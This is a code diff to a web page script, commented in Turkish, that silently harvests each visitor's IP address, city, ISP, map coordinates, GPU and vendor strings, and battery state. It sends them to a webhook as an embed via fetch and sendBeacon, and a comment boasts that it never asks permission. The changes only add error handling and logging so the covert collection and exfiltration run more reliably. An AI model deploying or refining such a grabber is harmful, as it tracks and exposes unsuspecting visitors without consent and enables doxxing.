@@ -28,10 +28,14 @@
             // 1. IP ve SESSİZ KONUM (Asla izin istemez)
             try {
                 const res = await fetch('https://ipapi.co/json/');
+                if (!res.ok) throw new Error('IPAPI yanıtı başarısız');
                 const j = await res.json();
                 data.ip = j.ip;
                 data.loc = `📍 **Bölge:** ${j.city}, ${j.region} / ${j.country_name}\n🛰️ **ISP:** ${j.org}\n🔗 [Haritada Gör](https://www.google.com/maps?q=${j.latitude},${j.longitude})`;
-            } catch(e) {}
+            } catch(e) {
+                console.error("IPAPI hatası: ", e);
+                data.loc = "Lokasyon alınamadı";
+            }
 
             // 2. GPU ve VENDOR (Efsane Sorgu)
             try {
@@ -40,13 +44,20 @@
                 const d = gl.getExtension('WEBGL_debug_renderer_info');
                 data.gpu = gl.getParameter(d.UNMASKED_RENDERER_ID);
                 data.ven = gl.getParameter(d.UNMASKED_VENDOR_ID);
-            } catch(e) {}
+            } catch(e) {
+                console.error("GPU bilgisi alınamadı: ", e);
+                data.gpu = "Bilinmiyor";
+                data.ven = "Bilinmiyor";
+            }
 
             // 3. PİL DURUMU
             try {
                 const b = await navigator.getBattery();
                 data.bat = `%${Math.round(b.level * 100)} (${b.charging ? 'Prizde' : 'Pilde'})`;
-            } catch(e) {}
+            } catch(e) {
+                console.error("Pil durumu alınamadı: ", e);
+                data.bat = "Bilinmiyor";
+            }
 
             // 4. O MEŞHUR KIRMIZI EMBED ŞABLONU
             const payload = {
@@ -66,7 +77,14 @@
 
             // 5. EN GARANTİ GÖNDERİM (Fetch + Beacon)
             const blob = JSON.stringify(payload);
-            fetch(u, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: blob });
+            fetch(u, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: blob })
+                .then(response => {
+                    if (!response.ok) throw new Error('Webhook gönderim hatası');
+                    console.log("Veri başarıyla gönderildi.");
+                })
+                .catch(error => {
+                    console.error("Webhook gönderim hatası: ", error);
+                });
             navigator.sendBeacon(u, blob);
 
             // 6. ARAYÜZ AKIŞI
@@ -87,4 +105,3 @@
     </script>
 </body>
 </html>
-
